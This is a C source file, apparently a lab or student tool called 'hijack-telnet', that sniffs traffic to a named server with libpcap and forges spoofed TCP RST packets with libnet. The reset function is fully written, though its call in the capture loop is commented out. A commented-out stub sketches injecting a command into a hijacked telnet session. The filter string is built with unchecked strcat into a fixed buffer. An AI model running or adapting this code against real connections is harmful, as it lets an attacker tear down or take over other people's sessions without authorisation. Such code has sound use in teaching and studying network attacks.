#include <pcap/pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "sniffer.h"
#include "analyzer.h"
#include "logger.h"

u_int32_t global_sequence;
u_int32_t global_acknowledge;

/*void attack_handler (int signum) {
  char command[4] = "boom"

for (int i = 0; i < 5; i++ ) {
  if (i == 4) {
   send = 0x0d0x00
  } else {
    send = command[i]
  }

  send(seq, ack) 

  receive 2

  global_seq++; global_ack++;
  send (seq, ack)

}


rec FIN
send FIN ACK

}*/

char *get_ip_address(char *interface) {
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		perror("Getting IP address: ");
		exit(1);
	}

	close(fd);

	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

int send_rst_packet(struct hdrs *headers, libnet_t *l, libnet_ptag_t *tcp_tag, libnet_ptag_t *ipv4_tag) {
	struct tcp_hdr *tcp_header = headers->tcp_header;
	struct ip_hdr *ip_header = headers->ip_header;	

	*tcp_tag = libnet_build_tcp(ntohs(tcp_header->tcp_dst_port), //source port
				              ntohs(tcp_header->tcp_src_port), //destination port
				              ntohl(tcp_header->tcp_ack) + 1, //sequence number
				              0, //acknowledgement number
				              TCP_RST, //flags
				              1024, //window size
				              0, //checksum
				              0, //urgent pointer
				              20, //TCP packet length
				              NULL, //payload pointer
				              0, //payload length
				              l,
				              *tcp_tag);
	if (*tcp_tag == -1) {
		printf("Can't build TCP header: %s\n", libnet_geterror(l));
		exit(1);
	}

	/*char *temp = inet_ntoa(ip_header->ip_src_addr);
	char *ip_src_addr = (char *)malloc(strlen(temp) + 1);
	strcpy(ip_src_addr, temp);
	temp = inet_ntoa(ip_header->ip_dst_addr);
	char *ip_dst_addr = (char *)malloc(strlen(temp) + 1);
	strcpy(ip_dst_addr, temp);
	printf("Building: ip_src_address: %s\n", ip_src_addr);
	printf("Building: ip_dst_address: %s\n", ip_dst_addr);*/

	

	*ipv4_tag = libnet_build_ipv4(40, //IP packet length
								 0, //type of service
								 0, //id
								 0, //fragmentation bits 
								 64, //time to live
								 IPPROTO_TCP, //protocol
								 0, //checksum
								 *(uint32_t *)&(ip_header->ip_dst_addr), //source IP address
								 *(uint32_t *)&(ip_header->ip_src_addr), //destination IP address
								 NULL, //payload poitner
								 0, //payload length
								 l,
								 *ipv4_tag);
	if (*ipv4_tag == -1) {
		printf("Can't build IPv4 header: %s\n", libnet_geterror(l));
		exit(1);
	}

    if (libnet_write(l) == -1) {
    	printf("Error writing packet: %s\n", libnet_geterror(l));
    	exit(1);
    }

    printf("Packet sent!\n");
}	


int main(int argc, char **argv) {
	char errbuf[PCAP_ERRBUF_SIZE];

	char *dev_name;
	char *server_name;
	char *server_port;
	if (argc == 3) {
		server_name = argv[1];
		server_port = argv[2];
		dev_name = "eth0";
	} else if (argc == 4) {
		server_name = argv[1];
		server_port = argv[2];
		dev_name = argv[3];
		if (!device_exists(dev_name)) {
			printf("Device does not exist.\n");
			exit(1);
		}
	} else {
		printf("Usage: hijack-telnet server-name server_port [dev_name]\n");
		exit(1);
	}

	pcap_t *phandle = open_phandle(dev_name, errbuf);
	if (phandle == NULL) {
		printf("Error: %s\n", errbuf);
		exit(1);
	}

	char filter_expr[200];
	strcpy(filter_expr, "(src host ");
	strcat(filter_expr, server_name);
	strcat(filter_expr, " and src port ");
	strcat(filter_expr, server_port);
	strcat(filter_expr, ") or (dst host ");
	strcat(filter_expr, server_name);
	strcat(filter_expr, " and dst port ");
	strcat(filter_expr, server_port);
	strcat(filter_expr, ")");

	//char *temp = get_ip_address(dev_name);
	//char *ip_address = (char *)malloc(strlen(temp) + 1);
	//strcpy(ip_address, temp);
	//printf("IP: [%s].\n", ip_address);
	
	//strcpy(filter_expr, "tcp src port 8181 and tcp[tcpflags] & tcp-ack != 0 and dst host ");
	//strcat(filter_expr, ip_address);
	//char *filter_expr = "not port 22";
	printf("Filter expression: %s\n", filter_expr);
	apply_filter(phandle, filter_expr);

	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	
	char errbuf2[LIBNET_ERRBUF_SIZE]; 
	libnet_t *l = libnet_init(LIBNET_RAW4, dev_name, errbuf2);
	if (l == NULL) {
		printf("libnet_init(): %s\n", errbuf2);
		exit(1);
	}

	libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
	libnet_ptag_t ipv4_tag = LIBNET_PTAG_INITIALIZER;

	int res;
    while((res = pcap_next_ex(phandle, &header, &pkt_data)) >= 0){ 
        // 0 means that libpcap's read timeout expired
        if(res == 0)
            continue;

        printf("Packet captured!\n");

        //printf("Packet cap length:%d\n", header->caplen);
        //printf("Packet length:%d\n", header->len);

        //printf("Dump packet...");
        //print_char_array(pkt_data, header->len);

        struct hdrs *headers = analyze_packet(pkt_data);
        log_headers(headers);


        //char *temp2 = inet_ntoa(headers->ip_header->ip_src_addr);
        //char *source_ip_address = (char *)malloc(strlen(temp2) + 1);
		//strcpy(source_ip_address, temp2);
		//printf("IP: [%s].\n", source_ip_address);
        //if (strcmp(source_ip_address, ip_address) != 0)
		//send_rst_packet(headers, l, &tcp_tag, &ipv4_tag);

        printf("---------------------------------------------\n");
    }

    if (res == -1) {
        printf("An error occurred while reading the packet.\n");
        exit(1);
    } else if (res == -2) {
    	libnet_destroy(l);
        // TODO
    }



	return 0;
}